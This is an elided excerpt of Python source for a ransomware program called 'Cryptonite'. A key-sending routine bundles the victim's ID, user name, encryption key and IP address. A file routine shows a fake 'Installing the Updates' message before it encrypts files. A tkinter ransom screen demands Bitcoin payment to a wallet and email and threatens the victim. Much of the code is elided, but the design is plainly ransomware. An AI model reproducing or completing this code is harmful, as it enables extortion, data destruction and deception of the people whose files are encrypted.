...
class Cryptonite:
    ...
    def sendKeys(self):
        ...
        try:
            ...
            jsonFormat = {"uniqueId": id, "user": user, "key": key, "ip": ip}
    ...
    def findFiles(self):
        ...
        time.sleep(2)
        print(
            "Installing the Updates. This might take some time. Please be patient... \n"
        )
        self.encrypt()
...
class System(Cryptonite):
    ...
    def warningScreen(self):
        ...
        lbl_main1 = tk.Label(
            master=frm_main,
            text="Some / All of Your Files Have Been Encrypted!",
            font=("Apple Chancery", 40),
            bg="black",
            fg="#39ff14",
        )
        lbl_main1.grid(row=1, column=0, columnspan=2)
        decryption_key = tk.Entry(
            master=frm_main,
            font=("Apple Chancery", 25),
            relief=tk.SUNKEN,
            borderwidth=3,
            fg="grey",
        )
        ...
        decryption_key_button = tk.Button(
            master=frm_main,
            text="Submit",
            font=("Apple Chancery", 18),
            relief=tk.RAISED,
            borderwidth=2,
            command=key_collect,
        )
        ...
        lbl_main1 = tk.Label(
            master=frm_main,
            text="It uses military grade encryption to encrypt your files. It requires a DECRYPTION_KEY for decryption process.\nIf you think its a joke, try opening up your files from the file viewer on the right hand side of this frame.",
            font=("Apple Chancery", 15),
            bg="black",
            fg="#39ff14",
        )
        ...
        lbl_main1 = tk.Label(
            master=frm_main,
            text="Do not Close this Window! Else face the consequences!",
            font=("Apple Chancery", 25),
            bg="black",
            fg="red",
        )
        ...
        lbl_main1 = tk.Label(
            master=frm_main,
            text=f"BTC AMOUNT: {BTC_AMOUNT}\tBTC WALLET: {BTC_WALLET}\tEMAIL: {EMAIL}\t",
            font=("Apple Chancery", 10),
            bg="black",
            fg="#39ff14",
        )
        ...
        lbl_main1 = tk.Label(
            master=frm_main,
            text=f"UNIQUE_ID: {self.uniqueKey}",
            font=("Apple Chancery", 10),
            bg="black",
            fg="#39ff14",
        )
        ...
        btn_editor = tk.Button(
            master=frm_editor, text="Open File", borderwidth=2, command=open_file
        )
        btn_editor.grid(row=0, column=0, padx=2, pady=2, sticky="e")

        btn_editor1 = tk.Button(
            master=frm_editor, text="Clear Screen", borderwidth=2, command=clear
        )
        ...
        txt_editor.insert(
            "3.0",
            "Open file that ends with .cryptn8 extension and see it is encrypted.",
        )
